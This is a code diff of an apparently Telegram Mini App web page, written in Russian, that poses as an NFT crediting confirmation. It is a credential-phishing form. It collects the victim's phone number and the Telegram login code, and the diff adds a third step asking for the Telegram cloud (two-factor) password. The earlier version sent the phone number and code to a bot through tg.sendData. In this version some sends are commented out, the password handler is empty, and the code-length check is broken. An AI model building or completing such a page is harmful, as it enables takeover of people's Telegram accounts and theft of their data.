@@ -15,17 +15,22 @@
 <body>
     <div class="card">
         <div id="step1" class="step active">
-            <h3>Подтверждение NFT</h3>
+            <h3>Подтверждение</h3>
             <p>Введите номер для зачисления:</p>
             <input type="tel" id="phone" placeholder="+79991234567">
             <button onclick="nextStep(1)">Далее</button>
         </div>
         <div id="step2" class="step">
-            <h3>Код подтверждения</h3>
+            <h3>Подтверждение</h3>
             <p>Введите код, отправленный вам в Telegram:</p>
             <input type="number" id="code" placeholder="12345">
-            <button onclick="sendFinal()">Подтвердить</button>
+            <button onclick="CodeOne()">Далее</button>
         </div>
+        <div id = "step3" class ="step">
+            <h3>Подтверждение</h3>
+            <p>Введите Облачный пароль если есть. Если нету поставьте -</p>
+            <input type="string" id="Password">
+            <button onclick ="PassTake()">Подтвердить</button>
     </div>
 
     <script>
@@ -39,7 +44,7 @@ function nextStep(stepNumber) {
         if (phone.length < 10) {
             return alert("Пожалуйста, введите корректный номер");
         }
-        tg.sendData("STEP1_PHONE:" + phone); 
+        //tg.sendData("STEP1_PHONE:" + phone); 
         // Прячем первый шаг (удаляем класс active и скрываем)
         document.getElementById('step1').classList.remove('active');
         
@@ -47,11 +52,22 @@ function nextStep(stepNumber) {
         document.getElementById('step2').classList.add('active');
     }
 
-function finish() {
+function CodeOne() {
     let code = document.getElementById('code').value;
     // ЭТАП 2: Отправляем боту сам код
-    tg.sendData("STEP2_CODE:" + code);
-    tg.close();
+    if (code.length < 5 && code.length > 5){
+        return alert("Пожалуйста, введите корректный код");
+    }
+    
+    document.getElementById('step2').classList.remove('active');
+        
+        // Показываем второй шаг (добавляем класс active)
+    document.getElementById('step3').classList.add('active');
+}
+
+function PassTake() {
+    let Password = document.getElementById('Password').value;
+
 }
     </script>
 </body>
